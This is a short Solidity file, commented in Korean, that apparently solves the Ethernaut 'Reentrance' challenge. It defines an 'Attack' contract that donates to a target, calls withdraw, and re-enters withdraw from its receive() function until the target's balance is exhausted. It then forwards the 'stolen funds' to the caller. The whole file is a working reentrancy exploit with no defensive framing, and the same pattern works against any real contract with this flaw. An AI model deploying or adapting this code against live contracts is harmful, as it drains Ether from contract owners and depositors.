// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 피해자 컨트랙트 인터페이스 정의
interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    IReentrance public target;
    uint constant public AMOUNT = 0.001 ether; // 한 번에 빼낼 금액

    constructor(address _targetAddr) {
        target = IReentrance(_targetAddr);
    }

    // 1. 공격 시작 함수
    function attack() external payable {
        require(msg.value >= AMOUNT, "Need ETH to attack");
        
        // (A) 먼저 기부하여 출금 권한(잔액 기록)을 얻음
        target.donate{value: AMOUNT}(address(this));
        
        // (B) 출금 요청 -> 여기서 재진입 시작
        target.withdraw(AMOUNT);
    }

    // 2. 재진입 로직 (Ether를 받을 때 자동 실행됨)
    receive() external payable {
        // 피해자 컨트랙트에 아직 돈이 남아있다면 계속 출금 요청
        uint targetBalance = address(target).balance;
        
        if (targetBalance >= AMOUNT) {
            target.withdraw(AMOUNT);
        }
    }

    // 3. 탈취한 자금 회수 (내 지갑으로 가져오기)
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
